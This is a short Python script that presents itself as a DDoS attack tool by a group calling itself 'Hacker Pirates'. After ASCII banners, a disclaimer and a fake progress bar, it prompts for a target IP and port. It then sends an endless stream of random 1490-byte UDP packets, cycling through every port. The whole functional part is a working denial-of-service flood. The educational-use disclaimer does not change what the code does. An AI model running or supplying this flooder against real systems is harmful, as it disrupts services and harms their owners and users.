import sys
import os
import time
import socket
import random
from datetime import datetime

# Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

print("\033[91m")

print('██████╗░██████╗░░█████╗░░██████╗░░░░░░░█████╗░████████╗██╗░░██╗')
print('██╔══██╗██╔══██╗██╔══██╗██╔════╝░░░░░░██╔══██╗╚══██╔══╝██║░██╔╝')       
print('██║░░██║██║░░██║██║░░██║╚█████╗░█████╗███████║░░░██║░░░█████═╝░')   
print('██║░░██║██║░░██║██║░░██║░╚═══██╗╚════╝██╔══██║░░░██║░░░██╔═██╗░')
print('██████╔╝██████╔╝╚█████╔╝██████╔╝░░░░░░██║░░██║░░░██║░░░██║░╚██╗')
print(' ╚═════╝░╚═════╝░░╚════╝░╚═════╝░░░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝')

print("Coded By : Ahraf Uzzaman")
print("Author   : Hacker Pirates")
print("Github   : ")
print("Disclaimer- This Tool is only for Educational Purpose. Don't Use this tool for any kind of Illegal Purpose.")
print()

ip = input("IP Target : ")
port = int(input("Port       : "))
print("\033[93m")
print("╭━━━┳━━━━┳━━━━┳━━━┳━━━┳╮╭━┳━━┳━╮╱╭┳━━━╮")
print("┃╭━╮┃╭╮╭╮┃╭╮╭╮┃╭━╮┃╭━╮┃┃┃╭┻┫┣┫┃╰╮┃┃╭━╮┃")
print("┃┃╱┃┣╯┃┃╰┻╯┃┃╰┫┃╱┃┃┃╱╰┫╰╯╯╱┃┃┃╭╮╰╯┃┃╱╰╯")
print("┃╰━╯┃╱┃┃╱╱╱┃┃╱┃╰━╯┃┃╱╭┫╭╮┃╱┃┃┃┃╰╮┃┃┃╭━╮")
print("┃╭━╮┃╱┃┃╱╱╱┃┃╱┃╭━╮┃╰━╯┃┃┃╰┳┫┣┫┃╱┃┃┃╰┻━┃")
print("╰╯╱╰╯╱╰╯╱╱╱╰╯╱╰╯╱╰┻━━━┻╯╰━┻━━┻╯╱╰━┻━━━╯")
print("Team : Hacker Pirates")
print("\033[92m")
print("[                    ] 0% ")
time.sleep(2)
print("[=====               ] 25%")
time.sleep(2)
print("[==========          ] 50%")
time.sleep(2)
print("[===============     ] 75%")
time.sleep(2)
print("[====================] 100%")
time.sleep(2)

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    port += 1
    print(f"Sent {sent} packet to {ip} through port: {port}")
    if port > 65535:  # Reset port to 1 if it exceeds 65535
        port = 1
